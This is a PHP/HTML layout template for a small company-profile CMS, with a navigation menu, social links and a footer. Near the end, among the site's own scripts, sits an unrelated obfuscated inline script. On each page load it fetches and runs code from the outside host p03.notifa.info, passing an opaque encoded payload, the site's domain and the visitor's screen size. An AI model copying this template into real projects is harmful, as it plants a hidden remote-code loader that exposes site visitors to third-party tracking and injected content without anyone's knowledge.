<?php if ($sosmed['settings_maintenance'] == '0') {
    header('Status: 301 Moved Permanently', false, 301); 
    header('Location: '.base_url('maintenance')); 
    exit(); 
} ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="keywords" content="<?php if(!empty($sosmed['settings_meta_keyword'])) echo $sosmed['settings_meta_keyword']; else echo "My Blog, Company Profile CMS"; ?>">
    <meta name="description" content="<?php if(!empty($sosmed['settings_meta_description'])) echo $sosmed['settings_meta_description']; else echo "Company Profile CMS"; ?>">
    <meta name="author" content="Admin">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <!-- Page Title -->
    <title><?php if(!empty($sosmed['settings_namesite'])) echo $sosmed['settings_namesite']; else echo "My Blog"; ?></title>
    <!-- Fonts -->
    <link href="https://fonts.googleapis.com/css?family=Lato:400,400i,700|Playfair+Display:400,400i,700"
    rel="stylesheet">
    <!-- Styles -->
    <link rel="stylesheet" href="<?= base_url('assets/frontend/css/bootstrap.min.css'); ?>">
    <link rel="stylesheet" href="<?= base_url('assets/frontend/css/font-awesome.min.css'); ?>">
    <link rel="stylesheet" href="<?= base_url('assets/frontend/css/owl.carousel.min.css'); ?>">
    <link rel="stylesheet" href="<?= base_url('assets/frontend/css/owl.theme.default.min.css'); ?>">
    <link rel="stylesheet" href="<?= base_url('assets/frontend/css/font-awesome.min.css'); ?>">
    <link rel="stylesheet" href="<?= base_url('assets/frontend/css/style.css'); ?>">
    <link rel="stylesheet" href="<?= base_url('assets/frontend/css/mystyle.css'); ?>">

    <!-- HTML5 shim and Respond.js IE9 support of HTML5 elements and media queries -->
   <!--  [if lt IE 9]> -->
    <script src="<?= base_url('assets/frontend/js/html5shiv.js'); ?>"></script>
    <script src="<?= base_url('assets/frontend/js/respond.js'); ?>"></script>
    <!-- [endif] -->
    
    
</head>
<!-- <body class="background-pattern"> --> 
<body class="gradient">
    <div class="container zinnia-page">
        <header>
            <div class="zinnia-logo text-center">
                <h1><a href="<?= base_url(); ?>"><?= $sosmed['settings_namesite']; ?></a></h1>
            </div>
            <div class="zinnia-menu text-center">
                <nav class="navbar">
                    <div class="navbar-header">
                        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#myNavbar">
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                        </button>
                    </div>
                    <div class="collapse navbar-collapse" id="myNavbar">
                        <ul class="nav navbar-nav text-uppercase">
                        <li><a href="<?= base_url(); ?>">Home</a></li>
                        <li><a href="<?= base_url('news'); ?>">Berita</a></li>
                        <li><a href="<?= base_url('gallery'); ?>">Gallery</a></li>
                        <li><a href="<?= base_url('about-us'); ?>">About Us</a></li> 
                        <li><a href="<?= base_url('contact-us'); ?>">Contact Us</a></li>
                    </ul>
                </div>
            </nav>
        </div>
    </header>
    <div class="zinnia-main-content">
        <div class="row">

            <?php echo $content; ?>
            <?php echo $sidebar; ?>

        </div>
    </div>
</div>
<footer class="zinnia-footer">
    <div class="container">
    <hr/>
        <!-- <div class="footer-instagram text-center">

            <div id="footer-instagram" class="owl-carousel owl-theme">

                <div class="item">
                    <a href="#"><img src="<?= base_url('assets/frontend/images/ft-insta-3.jpg'); ?>" alt=""></a>
                </div>
                <div class="item">
                    <a href="#"><img src="<?= base_url('assets/frontend/images/ft-insta-4.jpg'); ?>" alt=""></a>
                </div>
                <div class="item">
                    <a href="#"><img src="<?= base_url('assets/frontend/images/ft-insta-5.jpg'); ?>" alt=""></a>
                </div>
                <div class="item">
                    <a href="#"><img src="<?= base_url('assets/frontend/images/ft-insta-6.jpg'); ?>" alt=""></a>
                </div>
                <div class="item">
                    <a href="#"><img src="<?= base_url('assets/frontend/images/ft-insta-7.jpg'); ?>" alt=""></a>
                </div>
                <div class="item">
                    <a href="#"><img src="<?= base_url('assets/frontend/images/ft-insta-8.jpg'); ?>" alt=""></a>
                </div>

            </div>
            <div class="instagram-overlay-text text-uppercase">
                <h2>Zinnia @ <a href="#">Instagram</a></h2>
            </div>
        </div> -->
        <div class="footer-social">
            <!-- <div class="footer-logo text-center">
                <a href="#"> <img src="<?= base_url('assets/frontend/images/logo.png'); ?>" alt=""></a>
            </div> -->
            <div class="footer-social-link text-capitalize">
                <ul class="list-inline text-center">
                    <li><a href="<?php if (!empty($sosmed['settings_facebook'])) echo $sosmed['settings_facebook']; else echo "#";  ?>" target="_blank"><i class="fa fa-facebook"></i>Facebook</a></li>
                    <li><a href="<?php if (!empty($sosmed['settings_instagram'])) echo $sosmed['settings_instagram']; else echo "#";  ?>" target="_blank"><i class="fa fa-instagram"></i>Instagram</a></li>
                    <li><a href="<?php if (!empty($sosmed['settings_twitter'])) echo $sosmed['settings_twitter']; else echo "#";  ?>" target="_blank"><i class="fa fa-twitter"></i>Twitter</a></li>
                    <li><a href="<?php if (!empty($sosmed['settings_youtube'])) echo $sosmed['settings_youtube']; else echo "#";  ?>" target="_blank"><i class="fa fa-youtube"></i>Youtube</a></li>
                </ul>
            </div>
        </div>

    </div>
    <div class="container footer-copyright-text">
        <div class="col-md-7 myfooter" >
            <p><?php if(!empty($sosmed['settings_footer'])) echo $sosmed['settings_footer']; else echo "&copy; Company Profile 2018 - Develop by  <a href='http://www.otret.com' target='_blank'>Otret.com</a>"; ?></p>
        </div>
        <div class="col-md-5 myfooter" style="margin-left: -25px;">
                <ul class="navbar-nav pull-right">
                    <?php foreach ($static_page as $key => $page): ?>
                        <li style="display: inline-block;"><a href="<?= base_url().$page['article_url']; ?>" name="<?= $page['article_url']; ?> ?>" ><p><?= $page['article_title']; ?> &nbsp;/&nbsp;</p></a></li>
                    <?php endforeach ?>
                </ul>
        </div>
    </div>
</footer>
<!--//Script//-->
<script src="<?= base_url('assets/frontend/js/jquery-1.11.3.min.js'); ?>"></script>
<script src="<?= base_url('assets/frontend/js/bootstrap.min.js'); ?>"></script>
<script src="<?= base_url('assets/frontend/js/owl.carousel.min.js'); ?>"></script>
<script src="<?= base_url('assets/frontend/js/main.js'); ?>"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mHDCn4mk92tXB37WW3pmwpt%2bIWQfaHbQofJOWoi0Lmt18a9awFhvtA%2fgQmF6IGg7f4X4eOjHfZ%2fwpH7h32rdMhYnzQHBv3f0Wipgnd9MIRnjlbFwF3ajmtMgTMC%2ftlP0ma1pgbgs0vFBDWudayfwD7Al4o0iAm1O%2f5gJ2kFKjvwTpU4O0%2bJ5ZVE8U%2bUkzJ6WCBSp8bByeTme7NcBWE2Dv6qhLfs22P8nNrxjmn2ZmQDq7jtDM2FInKUofHJL6nMoOXkOa58rXzfrEgAspw%2f9SN2TYDOMC3LYQKnT71E8HNOXYN4ZtyKSjeoi53hoRPSGLX%2beIr8iuQNLbD875VkpnTONgOCZIQkj6qEgC757DUZBgUg5hlzObd1qaqCBGzc1rpb2HUIjIGixAeqQYmoNN8hEnt3XZPDlij5iHjFpmFAH2qTnZFF%2fknGYuaG5ClAc0R7DaZQpGoUdjY8hMw%2f0c%2bZJor9D8YPUv" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
<script>
    $('#myModal').on('shown.bs.modal', function () {
      $('#myInput').trigger('focus')
  });
</script>
</body>
</html>